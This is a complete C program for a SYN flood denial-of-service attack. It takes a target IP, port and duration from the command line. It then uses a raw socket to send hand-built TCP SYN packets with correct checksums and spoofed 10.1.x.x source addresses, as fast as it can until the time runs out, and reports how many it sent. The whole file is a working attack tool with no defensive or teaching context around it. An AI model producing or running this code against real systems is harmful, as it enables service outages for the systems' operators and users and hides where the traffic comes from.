#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    unsigned short oddbyte;
    while (nbytes > 1) { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1) { oddbyte = 0; *((u_char*)&oddbyte) = *(u_char*)ptr; sum += oddbyte; }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    return (short)~sum;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <Target IP> <Port> <Duration Sec>\n", argv[0]);
        return 1;
    }
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) { perror("Socket Error"); return 1; }

    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char datagram[128], pseudogram[128];
    memset(datagram, 0, sizeof(datagram));
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct pseudo_header psh;

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));
    sin.sin_addr.s_addr = inet_addr(argv[1]);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->daddr = sin.sin_addr.s_addr;

    tcph->dest = htons(atoi(argv[2]));
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(5840);

    int duration = atoi(argv[3]);
    time_t start = time(NULL);
    unsigned long count = 0;
    char spoof_ip[32];

    printf("[SYN_BLAST] Flooding %s:%s with spoofed 10.1.x.x SYN packets for %d sec...\n", argv[1], argv[2], duration);
    while (time(NULL) - start < duration) {
        snprintf(spoof_ip, sizeof(spoof_ip), "10.1.%lu.%lu", (count % 2), 2 + (count % 250));
        iph->saddr = inet_addr(spoof_ip);
        iph->id = htons(1000 + (count & 0xFFFF));
        iph->check = 0;
        iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));

        tcph->source = htons(1024 + (count % 60000));
        tcph->seq = htonl(count);
        tcph->check = 0;

        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        tcph->check = csum((unsigned short *)pseudogram, sizeof(struct pseudo_header) + sizeof(struct tcphdr));

        sendto(s, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
               (struct sockaddr *)&sin, sizeof(sin));
        count++;
    }
    printf("[SYN_BLAST] Completed! Total Spoofed SYN Packets Injected: %lu\n", count);
    close(s);
    return 0;
}


